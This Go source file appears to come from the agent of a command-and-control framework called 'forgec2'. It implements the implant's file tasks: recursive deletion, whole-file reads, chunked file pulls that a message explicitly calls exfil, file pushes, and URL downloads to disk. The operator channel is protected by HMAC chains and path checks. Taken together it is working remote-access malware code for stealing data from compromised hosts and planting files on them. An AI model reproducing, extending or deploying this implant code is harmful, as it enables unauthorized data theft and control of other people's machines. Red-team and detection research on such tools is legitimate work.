//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

// sanitizeWritePath rejects destination paths that attempt directory traversal
// via ".." components. An operator normally supplies explicit, well-formed
// absolute or relative paths; rejecting ".." prevents a forged/compromised task
// (or a URL-derived default that resolves to "..") from escaping the intended
// directory when the agent writes to disk. On Windows, Go's filepath.Clean
// normalizes both "/" and "\" separators, so the ".." check catches leading
// traversal segments after cleaning.
func sanitizeWritePath(p string) (string, error) {
	clean := filepath.Clean(p)
	if clean == ".." {
		return "", fmt.Errorf("path traversal rejected in %q", p)
	}
	for _, part := range strings.Split(clean, string(filepath.Separator)) {
		if part == ".." {
			return "", fmt.Errorf("path traversal rejected in %q", p)
		}
	}
	return clean, nil
}

// File-transfer resource limits (server mirrors them; see internal/server).
const (
	maxReadFileSize      = 64 << 20  // whole-file "read" task cap (use the download task instead)
	maxDownloadChunkSize = 4 << 20   // per-chunk cap for offset-based file pulls
	maxURLDownloadSize   = 256 << 20 // agent-side HTTP download cap
	maxUploadPushSize    = 50 << 20  // single push-chunk decode cap (mirrors server MaxUploadSize)
)

// file-chain integrity key, derived per agent from its registration key so it
// mirrors the server's crypto.DeriveFileChainKey (same HKDF parameters).
var fileChainKeyDerived []byte

// chunkChain tracks the last committed HMAC per task so batches of results for
// the same task (offset continuation) form one continuous integrity chain.
var chunkChain = struct {
	sync.Mutex
	prevByTask map[uint][]byte
}{prevByTask: make(map[uint][]byte)}

func fileChainKey() []byte {
	if len(fileChainKeyDerived) == 0 {
		fileChainKeyDerived = hkdfSHA256(loadAgentRegKey(), []byte("forgec2-filechain-v1"), []byte("file-transfer"))
	}
	return fileChainKeyDerived
}

func chainPrev(taskID uint) []byte {
	chunkChain.Lock()
	defer chunkChain.Unlock()
	if prev, ok := chunkChain.prevByTask[taskID]; ok {
		return prev
	}
	return make([]byte, 32) // chain seed
}

func chainCommit(taskID uint, mac []byte) {
	chunkChain.Lock()
	defer chunkChain.Unlock()
	chunkChain.prevByTask[taskID] = mac
}

// fileChunkMAC computes HMAC-SHA256(chainKey, prevMAC || data), the next link
// of the chunked file-transfer integrity chain.
func fileChunkMAC(chainKey, prevMAC, data []byte) []byte {
	mac := hmac.New(sha256.New, chainKey)
	mac.Write(prevMAC)
	mac.Write(data)
	return mac.Sum(nil)
}

// verifyFileChunk verifies an expected chain MAC over chunkData when non-empty.
// Returns nil when no MAC was supplied (legacy task) or when it matches.
func verifyFileChunk(taskID uint, expectedHexHex string, chunkData []byte) error {
	if expectedHexHex == "" {
		return nil
	}
	want, err := hex.DecodeString(expectedHexHex)
	if err != nil || len(want) != 32 {
		return fmt.Errorf("malformed chain MAC")
	}
	got := fileChunkMAC(fileChainKey(), chainPrev(taskID), chunkData)
	if hmac.Equal(got, want) {
		chainCommit(taskID, got)
		return nil
	}
	return fmt.Errorf("chunk HMAC mismatch (tampered/reordered data)")
}

// deleteFileOrDir removes file or directory (recursive)
func deleteFileOrDir(path string) error {
	if path == "" {
		return fmt.Errorf("path required")
	}
	return os.RemoveAll(path)
}

// readFileContent returns raw bytes of a file (for "read" task). Files larger
// than maxReadFileSize are refused to avoid pulling multi-GB blobs into memory.
func readFileContent(path string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	fi, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if fi.Size() > maxReadFileSize {
		return nil, fmt.Errorf("file too large (%d bytes, max %d) — use the download task for chunked exfil", fi.Size(), maxReadFileSize)
	}
	return os.ReadFile(path)
}

// downloadFileChunk reads a chunk from file, enforcing a per-chunk size cap so
// a malicious/compromised server cannot force the agent to allocate arbitrarily
// large buffers.
func downloadFileChunk(path string, offset, size int64) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("open file failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return nil, err
		}
	}
	if size <= 0 {
		size = 1024 * 1024 // default 1MB
	}
	if size > maxDownloadChunkSize {
		size = maxDownloadChunkSize
	}
	buf := make([]byte, size)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return nil, err
	}
	return buf[:n], nil
}

// uploadFileChunk verifies the push chunk's HMAC (when supplied) and writes the
// base64 chunk at offset. The chain is seeded with 32 zero bytes server-side.
func uploadFileChunk(taskID uint, path string, offset int64, b64Content string, prevMACHex, expectedMACHex string) error {
	data, err := base64.StdEncoding.DecodeString(b64Content)
	if err != nil {
		return fmt.Errorf("base64 decode failed: %w", err)
	}
	if len(data) > maxUploadPushSize {
		return fmt.Errorf("chunk too large (%d bytes, max %d)", len(data), maxUploadPushSize)
	}
	if prevMACHex != "" {
		prev, perr := hex.DecodeString(prevMACHex)
		if perr == nil && len(prev) == 32 {
			chunkChain.Lock()
			chunkChain.prevByTask[taskID] = prev
			chunkChain.Unlock()
		}
	}
	if err := verifyFileChunk(taskID, expectedMACHex, data); err != nil {
		return err // refuse to write unverified data
	}
	cleanPath, err := sanitizeWritePath(path)
	if err != nil {
		return err
	}
	openFlags := os.O_CREATE | os.O_WRONLY
	if offset == 0 {
		openFlags |= os.O_TRUNC
	}
	f, err := os.OpenFile(cleanPath, openFlags, 0644)
	if err != nil {
		return fmt.Errorf("open file for write failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return err
		}
	}
	_, err = f.Write(data)
	return err
}

// downloadFromURL downloads a file from HTTP URL to dest path on disk,
// enforcing a response size cap and rejecting directory-traversal destinations.
func downloadFromURL(urlStr, destPath string) error {
	if destPath == "" {
		return fmt.Errorf("destination path required")
	}
	if err := validateEgressURL(urlStr); err != nil {
		return err
	}
	cleanDest, err := sanitizeWritePath(destPath)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("http status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(io.LimitReader(resp.Body, maxURLDownloadSize+1))
	if err != nil {
		return err
	}
	if len(data) > maxURLDownloadSize {
		return fmt.Errorf("download exceeds size cap (%d bytes)", maxURLDownloadSize)
	}
	return os.WriteFile(cleanDest, data, 0600)
}
